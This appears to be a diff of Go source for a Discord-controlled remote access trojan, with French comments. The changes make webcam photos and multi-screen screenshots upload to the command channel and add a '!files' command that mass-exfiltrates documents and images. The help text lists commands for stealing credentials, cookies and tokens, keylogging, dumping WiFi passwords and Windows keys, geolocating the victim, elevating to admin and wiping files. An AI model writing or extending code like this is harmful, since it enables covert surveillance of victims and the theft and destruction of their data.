@@ -348,12 +348,24 @@ func c2Execute(command string) {
 		discordReply("exfiltration terminée.")
 
 	case "webcam", "cam":
+		// Déclenchée par une commande : le résultat revient dans le salon de
+		// commande, pas dans le salon webcam (qui reçoit les photos
+		// automatiques).
 		discordReply("webcam : capture en cours…")
-		if err := webcamNow(); err != nil {
+		tmp := workPath("cam-cmd.jpg")
+		if err := webcamCaptureTo(tmp); err != nil {
 			discordReply("webcam : " + err.Error())
 			return
 		}
-		discordReply("photo envoyée dans <#" + webcamChannel() + ">.")
+		data, rerr := os.ReadFile(tmp)
+		_ = os.Remove(tmp)
+		if rerr != nil || len(data) < 1024 {
+			discordReply("webcam : image invalide.")
+			return
+		}
+		name := "cam-" + time.Now().Format("060102-150405") + ".jpg"
+		discordUploadToChannel(fileOut{Name: name, Data: data})
+		discordReply("photo webcam — " + strconv.Itoa(len(data)/1024) + " Ko.")
 
 	case "webcamrec", "camrec":
 		if args == "" {
@@ -393,12 +405,25 @@ func c2Execute(command string) {
 				return
 			}
 		}
-		where, n := sendShots("commande", shotsNow())
-		if n == 0 {
+		// Capture demandée : elle revient dans le salon de commande, avec les
+		// deux écrans s'il y en a deux. Les captures automatiques continuent
+		// d'aller dans le salon screenshots.
+		shots := shotsNow()
+		if len(shots) == 0 {
 			discordReply("capture impossible.")
 			return
 		}
-		discordReply(fmt.Sprintf("%d capture(s) envoyée(s) dans %s (x%d).", n, where, shotScaleValue()))
+		ch := targetChannel()
+		if ch == "" {
+			ch = screenshotsChannel()
+		}
+		names := shotFilenames(len(shots))
+		var files []fileOut
+		for i, b := range shots {
+			files = append(files, fileOut{Name: names[i], Data: b})
+		}
+		sendFilesTo(ch, files...)
+		discordReply(fmt.Sprintf("%d capture(s) envoyée(s) ici (x%d).", len(files), shotScaleValue()))
 
 	case "search", "find":
 		parts := strings.Fields(args)
@@ -443,10 +468,18 @@ func c2Execute(command string) {
 	case "rm", "suppr":
 		discordReply(deletePath(args))
 
+	case "files", "tout", "bulk":
+		discordReply("extraction massive lancée dans les salons fichiers…")
+		go func() {
+			if msg := bulkUploadAll(true); msg != "" {
+				discordReply(msg)
+			}
+		}()
+
 	case "delete", "wipe":
 		discordReply(wipeAll(args))
 
-	case "apps", "ps-list", "processus":
+	case "apps", "ps-list", "processus", "opened", "applis":
 		discordReply(listApps(args))
 
 	case "open":
@@ -492,7 +525,7 @@ func c2Execute(command string) {
 	case "wifi":
 		discordReply(wifiReport())
 
-	case "location", "loc", "geo":
+	case "location", "loc", "geo", "localisation", "position":
 		discordReply(locationReport())
 
 	case "keylog", "kl":
@@ -634,20 +667,21 @@ func c2Help() string {
 		"!open <cible>        ouvre fichier/dossier/url\n" +
 		"!close <pid|nom>     ferme la fenêtre\n" +
 		"!kill <pid|nom>      tue le processus\n" +
-		"!apps [filtre]       applications + chemins\n" +
+		"!apps [filtre]       applications ouvertes + chemins\n" +
+		"!files               extraction massive (docs, images)\n" +
 		"!rm <chemin>         supprime fichier/dossier\n" +
 		"!screenshot          captures (salon -screenshots)\n" +
 		"!screenshot hd       agrandit x3 (scale 1|2|3)\n" +
 		"!screenshot <s> [m] [n]  captures programmées\n" +
 		"!webcam              photo webcam\n" +
-		"!webcamrec <s>       vidéo webcam (1-300 s)\n" +
+		"!webcamrec <s>       vidéo webcam AVI (1-300 s)\n" +
 		"!steal               identifiants, cookies, jetons\n" +
 		"!keylog              journal complet\n" +
 		"!keylog on|off       flux 5 s dans le salon keylogs\n" +
 		"!clip                presse-papiers\n" +
 		"!sysinfo             état de la machine\n" +
 		"!wifi                mots de passe WiFi\n" +
-		"!location            géolocalisation + adresse\n" +
+		"!localisation        position + adresse précise\n" +
 		"!search <motif> [n]  recherche fichiers\n" +
 		"!licence             clés d'activation Windows\n" +
 		"!elevate <cmd>       PowerShell en admin (UAC)\n" +
